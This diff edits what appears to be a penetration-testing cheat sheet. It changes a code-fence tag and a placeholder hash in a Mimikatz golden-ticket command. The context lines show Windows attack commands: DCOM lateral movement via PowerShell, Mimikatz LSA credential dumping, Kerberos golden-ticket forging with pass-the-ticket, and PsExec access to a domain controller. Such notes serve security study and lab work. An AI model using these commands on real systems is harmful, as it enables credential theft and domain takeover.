@@ -1723,8 +1723,7 @@ history
 
 Basic commands
 
-```jsx
-
+```js
 psql --host=127.0.0.1 -U postgres
 \list # List databases
 \c <database> # use the database
@@ -2188,7 +2187,7 @@ $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -no
 lsadump::lsa /patch
 //clean ticket
 kerberos::purge
-kerberos::golden /user:dave /domain:fake.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:3d9d3d9d3d9d3d9d3d9d3d9d3d9d /ptt
+kerberos::golden /user:dave /domain:fake.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:ce1dce1dce1dce1dce1dce1d /ptt
 misc::cmd
 //access
 PsExec.exe \\dc1 cmd.exe
